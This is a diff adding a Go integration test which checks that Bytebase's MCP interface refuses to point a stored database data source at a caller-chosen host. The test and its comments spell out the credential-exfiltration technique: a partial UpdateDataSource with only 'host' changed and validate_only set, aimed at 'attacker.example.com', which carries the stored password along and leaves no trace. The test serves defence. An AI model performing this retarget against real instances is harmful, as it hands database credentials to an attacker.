@@ -448,6 +448,95 @@ func TestMCPCannotWriteTrustAnchorsOrShipStoredSecrets(t *testing.T) {
 		"TestEmailSetting carries no audit annotation either — same gap, same fix")
 }
 
+// TestMCPCannotRetargetADataSource covers the same "carry a stored secret to a
+// host the caller named" shape as the two Test methods, against the database's
+// credentials rather than Bytebase's own.
+//
+// UpdateDataSource merges a partial request onto the STORED, already-decrypted
+// data source: an update_mask naming only `host` keeps the stored password,
+// ssl_key and ssh_private_key. With validate_only it dials the caller's host
+// immediately (checkAndLogInstanceConnection → GetDataSourceDriver → Ping) and
+// persists nothing, so the exfiltration leaves no trace in the instance record.
+// Nothing filters the host on that path.
+//
+// A database user is a principal other than the caller, the same way the SMTP
+// account behind TestEmailSetting is, so this shares their reason.
+//
+// The instance here needs no live database: CreateInstance only connects when
+// validate_only is set, so a fabricated host with a stored password is enough
+// to give the retarget something to inherit. In the RED state this probe
+// reports the dial to the attacker host rather than a refusal.
+func TestMCPCannotRetargetADataSource(t *testing.T) {
+	t.Parallel()
+	a := require.New(t)
+	ctx := context.Background()
+	ctl := &controller{}
+
+	ctx, err := ctl.StartServerWithExternalPg(ctx)
+	a.NoError(err)
+	defer ctl.Close(ctx)
+
+	const storedDBPassword = "stored-db-secret"
+	const realHost = "db.internal.example.com"
+	const dataSourceID = "admin-ds"
+	instance, err := ctl.instanceServiceClient.CreateInstance(ctx, connect.NewRequest(&v1pb.CreateInstanceRequest{
+		InstanceId: "retarget-probe",
+		Instance: &v1pb.Instance{
+			Title:       "retarget probe",
+			Engine:      v1pb.Engine_POSTGRES,
+			Environment: new("environments/prod"),
+			DataSources: []*v1pb.DataSource{{
+				Id:       dataSourceID,
+				Type:     v1pb.DataSourceType_ADMIN,
+				Username: "bytebase",
+				Password: storedDBPassword,
+				Host:     realHost,
+				Port:     "5432",
+			}},
+		},
+	}))
+	a.NoError(err, "precondition: an instance whose stored credential the retarget can inherit")
+
+	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
+	defer session.Close()
+
+	// update_mask names only the destination, so the stored password rides
+	// along untouched; validate_only makes Bytebase dial it right now.
+	retargeted := callAPIOnSession(ctx, t, session, "InstanceService/UpdateDataSource", map[string]any{
+		"name":         instance.Msg.Name,
+		"dataSource":   map[string]any{"id": dataSourceID, "host": "attacker.example.com"},
+		"updateMask":   "host",
+		"validateOnly": true,
+	})
+	t.Logf("MCP UpdateDataSource{host → attacker, validateOnly} → status=%d error=%q",
+		retargeted.Status, retargeted.Error)
+
+	a.Equal(http.StatusForbidden, retargeted.Status,
+		"the retarget must be refused before Bytebase dials anything")
+	a.Contains(retargeted.Error, "not available to MCP sessions")
+	a.Contains(retargeted.Error, "principal other than the caller",
+		"a database user is a principal too; the denial should say so")
+
+	// Nothing moved. With validate_only the handler would not have persisted
+	// anyway, so this pins the persisting variant rather than the one-shot: a
+	// gate that let the call through without validate_only would show here.
+	after, err := ctl.instanceServiceClient.GetInstance(ctx, connect.NewRequest(&v1pb.GetInstanceRequest{
+		Name: instance.Msg.Name,
+	}))
+	a.NoError(err)
+	a.Len(after.Msg.DataSources, 1)
+	a.Equal(realHost, after.Msg.DataSources[0].Host,
+		"the data source must still point where the operator put it")
+
+	// The console keeps working — the gate is on the internal MCP chain only.
+	_, err = ctl.instanceServiceClient.UpdateDataSource(ctx, connect.NewRequest(&v1pb.UpdateDataSourceRequest{
+		Name:       instance.Msg.Name,
+		DataSource: &v1pb.DataSource{Id: dataSourceID, Port: "5433"},
+		UpdateMask: &fieldmaskpb.FieldMask{Paths: []string{"port"}},
+	}))
+	a.NoError(err, "a normal session must still be able to update a data source")
+}
+
 // TestMCPCannotRewriteItsOwnCeiling covers the one method refused for what it
 // governs rather than for what it hands out.
 //
